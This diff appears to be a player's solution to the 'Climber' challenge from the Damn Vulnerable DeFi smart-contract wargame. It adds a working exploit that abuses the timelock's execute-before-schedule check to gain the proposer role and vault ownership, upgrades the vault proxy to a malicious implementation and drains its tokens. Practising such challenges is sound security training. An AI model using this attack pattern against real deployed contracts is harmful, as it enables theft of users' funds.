@@ -84,7 +84,12 @@ contract ClimberChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_climber() public checkSolvedByPlayer {}
+    function test_climber() public checkSolvedByPlayer {
+        HackClimber hack = new HackClimber(vault, timelock, token, recovery);
+        hack.pwnExecute();
+        (bool ok,) = address(vault).call(abi.encodeWithSignature("pwnWithdrawAll()"));
+        require(ok);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -94,3 +99,67 @@ contract ClimberChallenge is Test {
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
 }
+
+contract HackClimber {
+    ClimberVault vault;
+    ClimberTimelock timelock;
+    NewImpl newImple;
+
+    address[] targets = new address[](4);
+    uint256[] values = new uint256[](4);
+    bytes[] calldatas = new bytes[](4);
+
+    // keccak256("PROPOSER_ROLE");
+    bytes32 constant PROPOSE_ROLE = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1;
+    DamnValuableToken token;
+    address recovery;
+
+    constructor(ClimberVault _vault, ClimberTimelock _timelock, DamnValuableToken _token, address _recovery) {
+        vault = _vault;
+        timelock = _timelock;
+        token = _token;
+        recovery = _recovery;
+    }
+
+    function _setValues() internal {
+        targets = [address(timelock), address(timelock), address(vault), address(this)];
+        values = [0, 0, 0, 0];
+        calldatas = [
+            abi.encodeWithSignature("updateDelay(uint64)", 0), //slot 0
+            abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSE_ROLE, address(this)), //slot 1
+            abi.encodeWithSignature("transferOwnership(address)", address(this)), //slot 2
+            abi.encodeWithSignature("schedule()") //slot 3
+        ];
+    }
+
+    function pwnExecute() external {
+        _setValues();
+        timelock.execute(targets, values, calldatas, "1");
+
+        newImple = new NewImpl(token, recovery, vault);
+        vault.upgradeToAndCall(address(newImple), "");
+    }
+
+    function schedule() external {
+        timelock.schedule(targets, values, calldatas, "1");
+    }
+}
+
+contract NewImpl is ClimberVault {
+    DamnValuableToken immutable token;
+    address immutable recovery;
+    ClimberVault immutable vault;
+
+    constructor(DamnValuableToken _token, address _recovery, ClimberVault _vault) {
+        token = _token;
+        recovery = _recovery;
+        vault = _vault;
+    }
+
+    function pwnWithdrawAll() external {
+        require(address(this) == address(vault), "ajab");
+        bool ok = token.transfer(recovery, token.balanceOf(address(this)));
+        require(ok);
+    }
+}
+
